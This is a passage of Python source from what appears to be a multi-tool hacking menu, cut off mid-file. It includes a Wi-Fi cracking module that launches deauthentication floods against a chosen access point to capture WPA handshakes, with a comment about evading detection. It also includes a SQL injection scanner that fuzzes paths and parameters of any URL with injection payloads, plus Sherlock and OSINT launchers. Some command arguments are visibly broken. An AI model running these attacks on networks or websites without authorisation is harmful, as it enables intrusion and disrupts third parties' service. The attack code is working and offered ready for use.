            ...       .';;.    .';. .,;;;;;,.  .,;;,;;,. ..';;;;;,.  .,,;;;,.   .';,.   .,'   .,'.          
                    .oOOd'   .oO:.,kOdoooxd,.;kkolodkd'.;dOdoooxd'.lOdoolc'   ,xOk:.  ,ko..:do,           
                    .:klckl.  .lO:.,kx'...lOc.:Od,..;dx,.;dx,...lOc.okc....   .dd:dd'  ,kdcox:.    ....    
                    .;kd,'ok:. .oO:.,kOdoddxo,.;kkooodko.':dOxoddxo'.oOdlll;. .ckc.:ko. ,kOkOl.     ....    
                    .dOxooxOx, .oO:.,kx:,okl.  ;kd'..'oO:';dk:,lko. .ok:....  ,kOdldkk:.,kd;:dl.     ....   
                .lxc'..'cko..ok:.,xd. .cxl..;kkooloxd,.;ox' .cxo..lOdlllc,'od;...;dd',xl. ,oo,.          
                .''.    .',...'. .'.    .,. .',,,,,'.  ..'.   .,...,,,,''..'.     .'..'.   .''.          
                                                        ...                                                
                                                    .,::;'.                                              
                                                    .,:ccc;.                                              
                                                    ..,;;;'..                                             
                                                    ."..'".                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
        """
        AIRBREAK2_ASCII = r"""
         █████╗ ██╗██████╗ ██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗
        ██╔══██╗██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝
        ███████║██║██████╔╝██████╔╝██████╔╝█████╗  ███████║█████╔╝
        ██╔══██║██║██╔══██╗██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗
        ██║  ██║██║██║  ██║██████╔╝██║  ██║███████╗██║  ██║██║  ██╗
        ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
        """

        # Wi-Fi tool installation is handled by installer() below,
        # which auto-detects the package manager (works on any distro).

        # === FUNCTIONS ===
        def _pick_airbreak_terminal():
            import shutil as _sh
            for term, prefix in [
                ("gnome-terminal", ["gnome-terminal", "--"]),
                ("konsole", ["konsole", "-e"]),
                ("xfce4-terminal", ["xfce4-terminal", "-x"]),
                ("mate-terminal", ["mate-terminal", "--"]),
                ("x-terminal-emulator", ["x-terminal-emulator", "-e"]),
                ("alacritty", ["alacritty", "-e"]),
                ("kitty", ["kitty"]),
                ("xterm", ["xterm", "-e"]),
            ]:
                if _sh.which(term):
                    return prefix
            return ["gnome-terminal", "--"]

        _AIRBREAK_TERM = _pick_airbreak_terminal()

        def deauth_attack(target_bssid, target_channel, interfaceaftermonitoringmode):
            deauthtools = ["mdk4", "aireplay"]
            subprocess.run("clear",shell=True)
            print(GREEN + AIRBREAK_ASCII + RESET)
            print(GREEN + "="*18 + "DEAUTH ATTACK" + "=" * 18 + RESET)
            input("Press Enter to continue...")
            print(f"Tools for deauthentication attack: {deauthtools[0]}, {deauthtools[1]}")
            deauthtool = None
            while deauthtool not in (1, 2):
                raw = input("Which Tool for the Deauthentication attack do you want to use? 1 / 2->").strip()
                if raw in ("1", "2"):
                    deauthtool = int(raw)
                else:
                    print("Please enter 1 or 2.")
            if deauthtools[0] and deauthtools[1] in deauthtools:
                if deauthtool == 1:
                    print(f"Using {deauthtools[0]}...")
                    ql = input("Quiet or loud mode? ->")
                    if ql.strip().lower() == "quiet":
                        print("Using quiet mode...")
                        time.sleep(1)
                        try:
                            subprocess.Popen(
                                [
                                    *_AIRBREAK_TERM,
                                    "sudo",
                                    "airodump-ng",
                                    interfaceaftermonitoringmode,
                                    "--bssid",
                                    target_bssid,
                                    "-c",
                                    target_channel,
                                    "-w",
                                    "handshake_capture"
                                    
                                ]
                                )                      
                            subprocess.Popen(
                                [
                                    *_AIRBREAK_TERM,
                                    "sudo",
                                    "mdk4",
                                    interfaceaftermonitoringmode,
                                    "d",
                                    "-B",
                                    target_bssid,
                                    "-s",
                                    "15"
                                    
                                ]
                                )    
                            print("Starting deauths with 15 pakets per second.")
                            input("Press enter if the handshake is complete")
                            print("Exiting...\n Please close the two terminals now ") 
                            #NEU
                            subprocess.run("clear")
                            try:
                                handy = subprocess.getoutput("ls -la | grep handshake_capture")
                                print("="*50)
                                if handy == "":
                                    print("No handshake capture found... Please check if you have the necessary permissions to run the script and if the handshake capture file is in the correct directory.")
                                    time.sleep(1)
                                    print("Exiting...")
                                    exit()
                                else:
                                    print("Handshake capture found!")
                                    print(f"Handshake capture file: {handy}")
                                    print("="*50)
                                    try:
                                        print("Exiting in max 30 seconds")
                                        time.sleep(30)
                                        exit()
                                    except KeyboardInterrupt:
                                        print("Exiting...")
                                        exit()
                            except KeyboardInterrupt:
                                print("Interrupted by user...")
                                exit()
                            except PermissionError:
                                print("This is you")
                                subprocess.run("whoami",shell=True)
                                print("No Permissions for you to run this script...")
                            except FileNotFoundError:
                                print("Handshake capture file not found. Please check the directory and try again.")
                                time.sleep(1)
                                print("Exiting...")
                                exit()

                        except KeyboardInterrupt:
                            print("Interrupted by user...")
                        except PermissionError:
                            print("This is you")
                            subprocess.run("whoami",shell=True)
                            print("No Permissions for you to run this script...")

                    elif ql.strip().lower() == "loud":
                        print("Using loud mode...")
                        time.sleep(1)
                        try:
                            subprocess.Popen(
                                [
                                    *_AIRBREAK_TERM,
                                    "sudo",
                                    "airodump-ng",
                                    interfaceaftermonitoringmode,
                                    "--bssid",
                                    target_bssid,
                                    "-c",
                                    target_channel,
                                    "-w",
                                    "handshake_capture"
                                ]
                                )                      
                            subprocess.Popen(
                                [
                                    *_AIRBREAK_TERM,
                                    "sudo",
                                    "mdk4",
                                    interfaceaftermonitoringmode,
                                    "d",
                                    "-B",
                                    target_bssid
                                    
                                ]
                                )    
                            print("Starting deauths")
                            input("Press enter if the handshake is complete")
                            print("Exiting... Please close the two terminals now...") 
                            #NEU
                            subprocess.run("clear")
                            try:
                                handy = subprocess.getoutput("ls -la | grep handshake_capture")
                                print("="*50)
                                if handy == "":
                                    print("No handshake capture found... Please check if you have the necessary permissions to run the script and if the handshake capture file is in the correct directory.")
                                    time.sleep(1)
                                    print("Exiting...")
                                    exit()
                                else:
                                    print("Handshake capture found!")
                                    print(f"Handshake capture file: {handy}")
                                    print("="*50)
                                    try:
                                        print("Exiting in max 30 seconds")
                                        time.sleep(30)
                                        exit()
                                    except KeyboardInterrupt:
                                        print("Exiting...")
                                        exit()
                            except KeyboardInterrupt:
                                print("Interrupted by user...")
                                exit()
                            except PermissionError:
                                print("This is you")
                                subprocess.run("whoami",shell=True)
                                print("No Permissions for you to run this script...")
                            except FileNotFoundError:
                                print("Handshake capture file not found. Please check the directory and try again.")
                                time.sleep(1)
                                print("Exiting...")
                                exit()  

                        except KeyboardInterrupt:
                            print("Interrupted by user...")
                        except PermissionError:
                            print("This is you")
                            subprocess.run("whoami",shell=True)
                            print("No Permissions for you to run this script...")
                        
                elif deauthtool == 2:
                    print(f"Using {deauthtools[1]}...")
                    ql = input("Quiet or loud mode? ->")
                    if ql.strip().lower() == "quiet":
                        print("Using quiet mode...")
                        time.sleep(1)
                        try:
                            subprocess.Popen(
                                    [
                                        *_AIRBREAK_TERM,
                                        "sudo",
                                        "airodump-ng",
                                        interfaceaftermonitoringmode,
                                        "--bssid",
                                        target_bssid,
                                        "-c",
                                        target_channel,
                                        "-w",
                                        "handshake_capture"
                                    ]
                                    ) 
                            subprocess.Popen([
                                *_AIRBREAK_TERM,
                                "sudo",
                                "aireplay-ng"
                                "-0",
                                "1",
                                "-a",
                                target_bssid,
                                "--deauth-rc",   #Sending deauth with reason number "1", so it gets harder to detect.
                                "1",
                                interfaceaftermonitoringmode
                            ])
                            print("Starting deauths")
                            input("Press enter if the handshake is complete")
                            print("Exiting... Please close the two terminals now...") 
                            #NEU
                            subprocess.run("clear")
                            try:
                                handy = subprocess.getoutput("ls -la | grep handshake_capture")
                                print("="*50)
                                if handy == "":
                                    print("No handshake capture found... Please check if you have the necessary permissions to run the script and if the handshake capture file is in the correct directory.")
                                    time.sleep(1)
                                    print("Exiting...")
                                    exit()
                                else:
                                    print("Handshake capture found!")
                                    print(f"Handshake capture file: {handy}")
                                    print("="*50)
                                    try:
                                        print("Exiting in max 30 seconds")
                                        time.sleep(30)
                                        exit()
                                    except KeyboardInterrupt:
                                        print("Exiting...")
                                        exit()
                            except KeyboardInterrupt:
                                print("Interrupted by user...")
                                exit()
                            except PermissionError:
                                print("This is you")
                                subprocess.run("whoami",shell=True)
                                print("No Permissions for you to run this script...")
                            except FileNotFoundError:
                                print("Handshake capture file not found. Please check the directory and try again.")
                                time.sleep(1)
                                print("Exiting...")
                                exit()  
                        except KeyboardInterrupt:
                            print("Interrupted by user...")
                        except PermissionError:
                            print("This is you")
                            subprocess.run("whoami",shell=True)
                            print("No Permissions for you to run this script...")


                    elif ql.strip().lower() == "loud":
                        print("Using loud mode...") 
                        time.sleep(1)           
                        try:
                            subprocess.Popen(
                                    [
                                        *_AIRBREAK_TERM,
                                        "sudo",
                                        "airodump-ng",
                                        interfaceaftermonitoringmode,
                                        "--bssid",
                                        target_bssid,
                                        "-c",
                                        target_channel,
                                        "-w",
                                        "handshake_capture"
                                    ]
                                    ) 
                            subprocess.Popen([
                                *_AIRBREAK_TERM,
                                "sudo",
                                "aireplay-ng"
                                "-0",
                                "100",
                                "-a",
                                target_bssid,
                                "--death-rc",
                                "1",
                                interfaceaftermonitoringmode
                            ])
                            print("Starting deauths")
                            input("Press enter if the handshake is complete")
                            print("Exiting... Please close the two terminals now...") 
                            #NEU
                            subprocess.run("clear")
                            try:
                                handy = subprocess.getoutput("ls -la | grep handshake_capture")
                                print("="*50)
                                if handy == "":
                                    print("No handshake capture found... Please check if you have the necessary permissions to run the script and if the handshake capture file is in the correct directory.")
                                    time.sleep(1)
                                    print("Exiting...")
                                    exit()
                                else:
                                    print("Handshake capture found!")
                                    print(f"Handshake capture file: {handy}")
                                    print("="*50)
                                    try:
                                        print("Exiting in max 30 seconds")
                                        time.sleep(30)
                                        exit()
                                    except KeyboardInterrupt:
                                        print("Exiting...")
                                        exit()

                            except KeyboardInterrupt:
                                print("Interrupted by user...")
                                exit()
                            except PermissionError:
                                print("This is you")
                                subprocess.run("whoami",shell=True)
                                print("No Permissions for you to run this script...")
                            except FileNotFoundError:
                                print("Handshake capture file not found. Please check the directory and try again.")
                                time.sleep(1)
                                print("Exiting...")
                                exit()  
                        except KeyboardInterrupt:
                            print("Interrupted by user...")
                        except PermissionError:
                            print("This is you")
                            subprocess.run("whoami",shell=True)
                            print("No Permissions for you to run this script...")

                else:
                    print("No hack today (Invalid input)...")
                    exit()
            else:
                print("Invalid input")
        def start_monitor_mode(interface):
            # airmon-ng works identically across distros, so this is distro-neutral.
            print("Starting monitor mode...")
            subprocess.run("sudo airmon-ng check kill", shell=True)
            subprocess.run(f"sudo airmon-ng start {interface}", shell=True)
            subprocess.run("clear", shell=True)
            time.sleep(3)
        def installer(based=None):
            """Install the Wi-Fi tools, detecting the package manager so it works
            on any Linux distro (not a fixed distro-name whitelist)."""
            import shutil as _shutil
            try:
                from install import detect_pkg_manager, privilege_prefix
            except Exception:
                detect_pkg_manager = privilege_prefix = None

            # The aircrack-ng suite (aircrack-ng/airmon-ng/airodump-ng/aireplay-ng)
            # all come from a single `aircrack-ng` package - they are NOT separate
            # packages. mdk4 and a terminal emulator are their own packages.
            terminals = ("gnome-terminal", "konsole", "xfce4-terminal", "mate-terminal",
                         "x-terminal-emulator", "alacritty", "kitty", "xterm")
            suite = ("aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng")
            packages = []
            if any(_shutil.which(b) is None for b in suite):
                packages.append("aircrack-ng")
            if _shutil.which("mdk4") is None:
                packages.append("mdk4")
            if not any(_shutil.which(t) for t in terminals):
                packages.append("gnome-terminal")  # only if no terminal at all is present

            if not packages:
                print("All Airbreak tools are already installed. ✅")
                return

            pm = detect_pkg_manager() if detect_pkg_manager else None
            priv = privilege_prefix() if privilege_prefix else None

            if pm is None or priv is None:
                reason = "no package manager found" if pm is None else "no root (sudo/doas)"
                print(f"Cannot auto-install ({reason}). Install these manually: {', '.join(packages)}")
                return

            print(f"Detected package manager: {pm['label']}")
            for pkg in packages:
                print(f"Installing {pkg} ...")
                try:
                    subprocess.run(priv + pm["install"] + [pkg])
                except KeyboardInterrupt:
                    print("Installation interrupted by user.")
                    return
                except Exception as e:
                    manual = " ".join(pm["install"]) + " " + pkg
                    print(f"Error installing {pkg}: {e}  (try manually: {manual})")

            still = [b for b in ("aircrack-ng", "mdk4") if _shutil.which(b) is None]
            if not any(_shutil.which(t) for t in terminals):
                still.append("a terminal emulator")
            if still:
                print(f"Still missing: {', '.join(still)} - your distro's repos may not "
                      "provide them (e.g. mdk4 is not in Fedora's default repos).")
        def find_target():
            print("Opening airodump-ng in a new terminal to find your target...")
            interfaceaftermonitoringmode = subprocess.getoutput("iwconfig 2>&1 | grep 'IEEE 802.11' | awk '{print $1}'").splitlines()[0]
            subprocess.Popen(
            [
                *_AIRBREAK_TERM,
                "sudo",
                "airodump-ng",
                interfaceaftermonitoringmode
            ]
            )   
            time.sleep(3)
            input("Enter to continue...")
            
            target_bssid = input("Enter the BSSID of your target network: ").strip()
            target_channel = input("Enter the channel of your target network: ").strip()
            print(f"Target BSSID: {target_bssid}, Target Channel: {target_channel}")
            if target_bssid == "" or target_channel == "":
                print("Incomplete input")
                print("exiting...")
                time.sleep(1)
                exit()
            else:
                print("You can close the external terminal now...")
                time.sleep(0.5)
                deauth_attack(target_bssid, target_channel, interfaceaftermonitoringmode)
        def cont():
            print("="*50)
            input("Make sure you have the necessary permissions to run the script. Press Enter to continue...")
            print("="*50)
            print("Set your Target...")
            find_target()      
        def main():
            opsystems = ['linux', 'mac', 'windows', 'Linux', 'Mac', 'Windows', 'Arch', 'arch', 'Ubuntu', 'ubuntu', 
                        'Debian', 'debian', 'Fedora', 'fedora', 'Kali', 'kali', 'Parrot', 'parrot', 
                        'Manjaro', 'manjaro', 'Mint', 'mint', 'Elementary', 'elementary', 'Zorin', 'zorin', 
                        'Pop!_OS', 'pop!_os', 'MX Linux', 'mx linux', 'Solus', 'solus', 'OpenSUSE', 'opensuse', 
                        'Gentoo', 'gentoo', 'Void', 'void', 'Alpine', 'alpine', 'Slackware', 'slackware', 
                        'CentOS', 'centos', 'Red Hat', 'red hat', 'Arch Linux', 'arch linux', 'Ubuntu Linux', 
                        'ubuntu linux', 'Debian Linux', 'debian linux', 'Fedora Linux', 'fedora linux', 
                        'Kali Linux', 'kali linux', 'Parrot OS', 'parrot os', 'Manjaro Linux', 'manjaro linux', 
                        'Mint Linux', 'mint linux', 'Elementary OS', 'elementary os','endeavouros', 'endeavour os', 
                         'Endeavour OS', 'EndeavourOS', 'Zorin OS', 'zorin os', 
                        'Pop!_OS Linux', 'pop!_os linux', 'MX Linux OS', 'mx linux os', 'Solus OS', 'solus os', 
                        'OpenSUSE Linux', 'opensuse linux', 'Gentoo Linux', 'gentoo linux', 'Void Linux', 'void linux', 
                        'Alpine Linux', 'alpine linux', 'Slackware Linux', 'slackware linux', 'CentOS Linux', 
                        'centos linux', 'Red Hat Linux', 'red hat linux']
            
            print(GREEN + AIRBREAK2_ASCII + RESET)
            print("AIRBREAK - WPA2/WPA3 WIFI Password Cracker")
            print("S1BERIA")
            print("-"*50)
            print("Make sure you have the necessary tools installed: aircrack-ng, airmon-ng, airodump-ng, mdk4")
            
            opsys = input("Enter your operating system (Linux: ").strip().lower()

            if opsys not in opsystems:
                print("Invalid operating system. Please enter a valid Linux distro...")
                exit(1)
            else:
                print(f"Operating system: {opsys}")
                installer()
                
                # Select interfaces
                try:
                    interfaces = subprocess.getoutput("iwconfig 2>&1 | grep 'IEEE 802.11' | awk '{print $1}'").splitlines()
                    if not interfaces:
                        print("No wireless interfaces found. Please make sure you have a compatible wireless adapter.")
                        exit(1)

                    print("Available wireless interfaces:")
                    for idx, iface in enumerate(interfaces):
                        print(f"{idx + 1}. {iface}")
                    
                    interface = input("Type in your interface:").strip()
                    monyn = input("Do you want to set your interface into monitoring mode? y/n").lower().strip()

                    if monyn == "y":
                        print("Setting up the monitoring mode on your interface...")
                        start_monitor_mode(interface)
                        time.sleep(1)
                        cont()

                    elif monyn == "n":
                        cont()
                    
                    else:
                        print("Invalid input")
                except KeyboardInterrupt:
                    print("\nInterrupted by user...")
                    exit(0)
        if __name__ == "__main__":
            main()                    
    case "9":
        RESET = "\033[0m"
        GREEN = "\033[32m"

        SHERLOCK_ASCII = r"""
        _________.__                 .__                 __
        /   _____/|  |__   ___________|  |   ____   ____ |  | __
        \_____  \ |  |  \_/ __ \_  __ \  |  /  _ \_/ ___\|  |/ /
        /        \|   Y  \  ___/|  | \/  |_(  <_> )  \___|    <
        /_______  /|___|  /\___  >__|  |____/\____/ \___  >__|_ \
                \/      \/     \/                       \/     \/

        Official Sherlock Project
        https://github.com/sherlock-project/sherlock
        """


        def banner():
            print(GREEN + SHERLOCK_ASCII + RESET)
            print("=" * 60)


        def check_sherlock():
            try:
                subprocess.run(
                    [sys.executable, "-m", "sherlock_project", "--version"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    check=False,
                )
                return True
            except Exception:
                return False


        def search(username):
            print(f"\n[*] Suche nach '{username}'...\n")

            try:
                subprocess.run(
                    [sys.executable, "-m", "sherlock_project", username],
                    check=False
                )
            except FileNotFoundError:
                print("[!] Sherlock is not installed.")
                print("Install it with:")
                print("pip install sherlock-project")


        def main():
            banner()

            if not check_sherlock():
                print("[!] Sherlock was not found.")
                return

            username = input("Benutzername: ").strip()

            if not username:
                print("[!] No username entered.")
                return

            search(username)


        if __name__ == "__main__":
            main()
    case "15":
        import webbrowser

        OSINT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "osint_dashboard")
        RUN_SH = os.path.join(OSINT_DIR, "run.sh")

        OSINT_ASCII = r"""
         ██████╗ ███████╗██╗███╗   ██╗████████╗    ██████╗  █████╗ ███████╗██╗  ██╗██████╗  ██████╗  █████╗ ██████╗ ██████╗
        ██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝    ██╔══██╗██╔══██╗██╔════╝██║  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔══██╗
        ██║   ██║███████╗██║██╔██╗ ██║   ██║       ██║  ██║███████║███████╗███████║██████╔╝██║   ██║███████║██████╔╝██║  ██║
        ██║   ██║╚════██║██║██║╚██╗██║   ██║       ██║  ██║██╔══██║╚════██║██╔══██║██╔══██╗██║   ██║██╔══██║██╔══██╗██║  ██║
        ╚██████╔╝███████║██║██║ ╚████║   ██║       ██████╔╝██║  ██║███████║██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝
         ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝       ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝
                    WEB • USERNAME • EMAIL • PHONE   —   passive OSINT, no API keys required
        """

        if not os.path.isfile(RUN_SH):
            print(f"{Fore.RED}[!] OSINT dashboard not found (expected {RUN_SH}).{Style.RESET_ALL}")
        else:
            print(GREEN + OSINT_ASCII + RESET)
            print("=" * 74)
            port = input(f"{Fore.YELLOW}Port to run the dashboard on (default 8000): {Style.RESET_ALL}").strip()
            if not port.isdigit():
                port = "8000"
            url = f"http://127.0.0.1:{port}"

            print(f"{Fore.CYAN}[*] Starting OSINT Dashboard on {url}")
            print("[*] Dependencies are installed by install.py — if they're missing, run: python3 install.py")
            print(f"[*] Press Ctrl+C to stop the server and return to the menu.{Style.RESET_ALL}")

            def open_browser():
                # give uvicorn a moment to bind the port before opening the UI
                time.sleep(6)
                try:
                    webbrowser.open(url)
                except Exception:
                    pass

            proc = None
            try:
                threading.Thread(target=open_browser, daemon=True).start()
                osint_env = os.environ.copy()
                osint_env["PYTHON"] = sys.executable
                proc = subprocess.Popen(["bash", RUN_SH, port], cwd=OSINT_DIR, env=osint_env)
                proc.wait()
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Stopping OSINT Dashboard...{Style.RESET_ALL}")
            except FileNotFoundError:
                print(f"{Fore.RED}[!] 'bash' not found — cannot launch run.sh.{Style.RESET_ALL}")
            finally:
                if proc and proc.poll() is None:
                    proc.terminate()
                    try:
                        proc.wait(timeout=5)
                    except Exception:
                        proc.kill()
    case "99":
        print(f"{Fore.CYAN}[*] Opening NexusScan Settings …{Style.RESET_ALL}")
        try:
            from nexus_settings import launch as launch_settings
            launch_settings()
        except ImportError as exc:
            print(f"{Fore.RED}[!] Settings need PyQt5: {exc}{Style.RESET_ALL}")
            print("    Install: pip install PyQt5")
        except Exception as exc:
            print(f"{Fore.RED}[!] Could not open Settings: {exc}{Style.RESET_ALL}")

    case "100":
        print(f"{Fore.CYAN}[*] Opening module documentation …{Style.RESET_ALL}")
        try:
            from nexus_docs import launch as launch_docs
            launch_docs()
        except ImportError as exc:
            print(f"{Fore.RED}[!] Docs need PyQt5: {exc}{Style.RESET_ALL}")
            print("    Install: pip install PyQt5")
        except Exception as exc:
            print(f"{Fore.RED}[!] Could not open docs: {exc}{Style.RESET_ALL}")
    case "16":
        import string
        import secrets
        import math
        # Constants for the calculation
        POOL = string.ascii_letters + string.digits + string.punctuation
        POOL_SIZE = len(POOL) # 94 characters
        GUESSES_PER_SECOND = 100_000_000_000_000 # 100 trillion guesses/sec

        def format_time(seconds):
            if seconds < 1:
                return "less than 1 second"
            seconds_in_a_year = 365 * 24 * 60 * 60
            years = seconds / seconds_in_a_year
            
            if years >= 1_000_000_000:
                return f"approx. {years / 1_000_000_000:.1f} billion years"
            if years >= 1_000_000:
                return f"approx. {years / 1_000_000:.1f} million years"
            if years >= 1:
                return f"approx. {years:.1f} years"
            if seconds >= 86400:
                return f"approx. {seconds / 86400:.1f} days"
            if seconds >= 3600:
                return f"approx. {seconds / 3600:.1f} hours"
            return f"approx. {seconds / 60:.1f} minutes"

        def calculate_time_for_length(length):
            # Combinations / 2 (average crack time) / speed
            return (POOL_SIZE ** length / 2) / GUESSES_PER_SECOND

        def calculate_length_for_years(target_years):
            target_seconds = target_years * 365 * 24 * 60 * 60
            # Reverse the math: combinations = target_seconds * speed * 2
            required_combinations = target_seconds * GUESSES_PER_SECOND * 2
            # length = log(combinations) / log(pool_size)
            required_length = math.ceil(math.log(required_combinations) / math.log(POOL_SIZE))
            return max(required_length, 4) # Minimum length of 4

        def generate_password(length):
            return "".join(secrets.choice(POOL) for _ in range(length))

        # Main Menu
        print("=== Secure Password Generator ===")
        print("1. Generate by Character Length")
        print("2. Generate by Desired Crack Time (in Years)")

        choice = input("Choose an option (1 or 2): ").strip()

        if choice == "1":
            try:
                length = int(input("Enter desired password length (e.g., 14): "))
                if length < 4:
                    print("Password should be at least 4 characters long.")
                else:
                    password = generate_password(length)
                    crack_seconds = calculate_time_for_length(length)
                    
                    print("\n" + "="*45)
                    print(f"Generated Password: {password}")
                    print(f"Length:             {length} characters")
                    print(f"Estimated Crack Time: {format_time(crack_seconds)}")
                    print("="*45)
            except ValueError:
                print("Invalid input. Please enter a valid number.")

        elif choice == "2":
            try:
                years = float(input("How many YEARS should it take to crack? (e.g., 500): "))
                if years <= 0:
                    print("Please enter a number greater than 0.")
                else:
                    # Calculate required length for this time frame
                    needed_length = calculate_length_for_years(years)
                    password = generate_password(needed_length)
                    actual_seconds = calculate_time_for_length(needed_length)
                    
                    print("\n" + "="*45)
                    print(f"Generated Password: {password}")
                    print(f"Required Length:    {needed_length} characters")
                    print(f"Exact Crack Time:   {format_time(actual_seconds)}")
                    print("="*45)
                    print("*(Rounded up to ensure it meets or exceeds your time frame)")
            except ValueError:
                print("Invalid input. Please enter a valid number.")
        else:
            print("Invalid choice. Please restart the script and select 1 or 2.")
    case "17":
        sqlvulntest_ascii = """
        ▞▀▖▞▀▖▌  ▗     ▖      ▐  ▗        ▌ ▌   ▜             ▌  ▗▜ ▗▐      ▞▀▖         
        ▚▄ ▌ ▌▌  ▄ ▛▀▖▗▖▞▀▖▞▀▖▜▀ ▄ ▞▀▖▛▀▖ ▚▗▘▌ ▌▐ ▛▀▖▞▀▖▙▀▖▝▀▖▛▀▖▄▐ ▄▜▀ ▌ ▌ ▚▄ ▞▀▖▝▀▖▛▀▖
        ▖ ▌▌▚▘▌  ▐ ▌ ▌ ▌▛▀ ▌ ▖▐ ▖▐ ▌ ▌▌ ▌ ▝▞ ▌ ▌▐ ▌ ▌▛▀ ▌  ▞▀▌▌ ▌▐▐ ▐▐ ▖▚▄▌ ▖ ▌▌ ▖▞▀▌▌ ▌
        ▝▀ ▝▘▘▀▀▘▀▘▘ ▘▄▘▝▀▘▝▀  ▀ ▀▘▝▀ ▘ ▘  ▘ ▝▀▘ ▘▘ ▘▝▀▘▘  ▝▀▘▀▀ ▀▘▘▀▘▀ ▗▄▘ ▝▀ ▝▀ ▝▀▘▘ ▘
        ================================================================================
        Author: S1BERIA  
        """

        HEADERS = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
        }
        SESSION = requests.Session()


        def fetch(url):
            try:
                return SESSION.get(url, headers=HEADERS, timeout=10)
            except RequestException:
                print(f"    [!] Anfrage fehlgeschlagen: {url}")
                return None


        def read_wordlist(path):
            """Liest eine Wordlist, überspringt leere Zeilen. Kein 'end'-Sentinel nötig."""
            try:
                with open(path, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"[!] Datei nicht gefunden: {path}")
                sys.exit(1)


        def collect_ok_urls(base, wordlist_path):
            """Phase 1: Pfade aus Wordlist durchprobieren, Status 200 sammeln."""
            ok = []
            for word in read_wordlist(wordlist_path):
                url = urljoin(base, word)          # fügt Slash sauber ein
                r = fetch(url)
                if r is not None and r.status_code == 200:
                    ok.append(url)
                    print(f"    [200] {url}")
            return ok


        def collect_param_urls(url, wordlist_path):
            """Phase 2: Jede Zeile (z.B. 'id=1') als Query anhängen, 200 sammeln."""
            ok = []
            for param in read_wordlist(wordlist_path):
                test_url = url + "?" + param
                r = fetch(test_url)
                if r is not None and r.status_code == 200:
                    ok.append(test_url)
                    print(f"    [200] {test_url}")
            return ok


        def replace_last_param(url, payload):
            """Ersetzt den Wert des letzten Query-Parameters durch den Payload."""
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                return url + payload
            last = list(params)[-1]
            params[last] = [payload]
            return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))


        def test_sqli(url):
            """Phase 3: Boolean-basierte Tests. True vs. False-Payload, Antwort vergleichen."""
            print(f"    [*] {url}")
            base = fetch(url)
            if base is None:
                return False
            base_len = len(base.content)

            tests = [
                ("1 AND 1=1", "1 AND 1=2"),
                ("1' AND '1'='1", "1' AND '1'='2"),
                ('1" AND "1"="1', '1" AND "1"="2'),
            ]
            for true_p, false_p in tests:
                rt = fetch(replace_last_param(url, true_p))
                rf = fetch(replace_last_param(url, false_p))
                if rt is None or rf is None:
                    continue
                # Starkes Signal: true == Baseline, false weicht ab
                if len(rt.content) == base_len and len(rf.content) != base_len:
                    print(f"    [!!!] SQLi-Verdacht: '{true_p}' vs '{false_p}'")
                    return True
                # Schwaches Signal: Statuscodes unterscheiden sich
                if rt.status_code != rf.status_code:
                    print(f"    [?] Statusdifferenz: {true_p} -> {rt.status_code} vs {rf.status_code}")
            return False


        def scan_website(base):
            path_wl = input("Pfad zur Pfad-Wordlist: ")
            param_wl = input("Pfad zur Parameter-Wordlist: ")

            print("\n[1/3] Pfade durchsuchen ...")
            paths = collect_ok_urls(base, path_wl)
            print(f"[+] {len(paths)} erreichbare Pfade")

            print("\n[2/3] Parameter anhängen und testen ...")
            candidates = []
            for p in paths:
                candidates += collect_param_urls(p, param_wl)
            print(f"[+] {len(candidates)} Kandidaten-URLs")

            print("\n[3/3] Payload-Tests ...")
            hits = 0
            for c in candidates:
                if test_sqli(c):
                    hits += 1

            print(f"\n[=] Fertig. {hits} URL(s) mit SQLi-Verdacht.")


        def scan_single(url):
            payload_wl = input("Payload-Wordlist (Enter = eingebaute Payloads): ")
            payloads = read_wordlist(payload_wl) if payload_wl else [
                "'", "1'", "1 OR 1=1", "1 OR 1=2",
                "1' AND '1'='1", "1' AND '1'='2",
                "1; SELECT 1-- -",
                "1' UNION SELECT 1-- -",
            ]

            base = fetch(url)
            if base is None:
                return
            print(f"[+] Baseline: {base.status_code}, {len(base.content)} Bytes")

            for p in payloads:
                r = fetch(replace_last_param(url, p))
                if r is None:
                    continue
                notes = []
                if r.status_code != base.status_code:
                    notes.append(f"Status {base.status_code}->{r.status_code}")
                if len(r.content) != len(base.content):
                    notes.append("Body-Länge weicht ab")
                print(f"    {p:<28} -> {r.status_code}  {' | '.join(notes) if notes else ''}")


        def main():
            print(sqlvulntest_ascii)
            print("""
        1. Kompletter Scan (Pfad-Wordlist + Parameter-Wordlist + Payloads)
        2. Einzelne URL testen
        """)
            try:
                choice = int(input("Option: "))
            except ValueError:
                print("[!] Bitte 1 oder 2 eingeben.")
                sys.exit(1)

            if choice not in (1, 2):
                print("[!] Ungültige Option.")
                sys.exit(1)

            url = input("URL: ").strip()
            if not url.startswith(("http://", "https://")):
                print("[!] Ungültige URL – http:// oder https:// erwartet.")
                sys.exit(1)

            if choice == 1:
                scan_website(url)
            else:
                scan_single(url)


        if __name__ == "__main__":
            main()
    case "18":
        import sys
        import os
        import json
        import shutil
        import subprocess
        import re
        import zipfile
        import io
        from pathlib import Path
        from urllib.parse import quote

        import requests
        from PyQt5.QtWidgets import (
